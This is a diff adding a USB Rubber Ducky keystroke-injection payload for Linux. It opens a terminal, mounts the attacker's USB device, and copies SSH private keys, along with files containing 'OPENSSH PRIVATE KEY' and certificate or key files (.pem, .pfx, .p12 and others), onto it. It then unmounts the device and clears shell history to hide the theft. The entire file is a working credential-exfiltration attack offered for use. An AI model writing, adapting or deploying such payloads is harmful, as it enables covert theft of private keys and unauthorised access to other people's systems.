@@ -1,0 +1,47 @@
+REM Here you must indicate the name of the device you want to use to complete the data exfiltration. For example, a USB Rubber Ducky could be suitable: DUCK
+DEFINE #FileSystemLabel example
+
+REM Generally, 10 kb is sufficient for a certificate, but sometimes it may not be enough. If you know that your file exceeds this size and you still want to be able to store it, then you just need to change this reference.
+
+REM For example in find command for 10 kb you should write: 10k
+DEFINE #SizeOfOtherFilesInFind example
+
+CTRL-ALT t
+DELAY 1300
+STRING
+	DUCKY_LABEL=$(lsblk -nr -o NAME,LABEL | grep -i #FileSystemLabel | awk '{print $1}');
+	MOUNT_OUTPUT=$(udisksctl mount -b "/dev/$DUCKY_LABEL" 2>/dev/null);
+	MOUNT_POINT=$(echo $MOUNT_OUTPUT | awk -v IGNORECASE=1 -F ' at ' '/mounted/ {print $2}');
+	DEST_PATH="$MOUNT_POINT/keys/";
+	mkdir -p "$DEST_PATH";
+	DONE=0;
+	if [ -e "$HOME/.ssh/id_rsa" ]; 
+		then cp $HOME/.ssh/id_rsa* "$DEST_PATH";
+		DONE=1;
+	fi;
+	if [ "$DONE" != "1" ]; 
+	then SEARCH_PATH=$(find "$HOME" \( -type f -size -#SizeOfOtherFilesInFind -exec grep -qi "OPENSSH PRIVATE KEY" {} ; -print \) -o \( -type f -size -#SizeOfOtherFilesInFind -name "id_rsa*" \));
+		if [ -n "$SEARCH_PATH" ]; 
+			then while IFS= read -r file; 
+			do cp "$file" "$DEST_PATH";
+			DONE=1;
+			done <<< "$SEARCH_PATH";
+		fi;
+	fi;
+	if [ "$DONE" != "1" ]; 
+		then find "$HOME" -maxdepth 3 -type f -size -#SizeOfOtherFilesInFind \( -iname "*.pem" -o -iname "*.key" -o -iname "*.rsa" -o -iname "*.crt" 
+			-o -iname "*.cer" -o -iname "*.der" -o -iname "*.pfx" -o -iname "*.p12" \) 2>/dev/null | 
+		while IFS= read -r f; 
+		do if [[ "$f" == *.crt ]]; 
+			then cp -r "$(dirname "$f")" "$DEST_PATH";
+			else cp "$f" "$DEST_PATH"; 
+			fi;
+		done;
+	fi;
+	udisksctl unmount -b "$DUCKY_LABEL" > /dev/null 2>&1;
+	udisksctl power-off -b "$DUCKY_LABEL" > /dev/null 2>&1;
+	history -c;
+	exit
+END_STRING
+DELAY 500
+ENTER
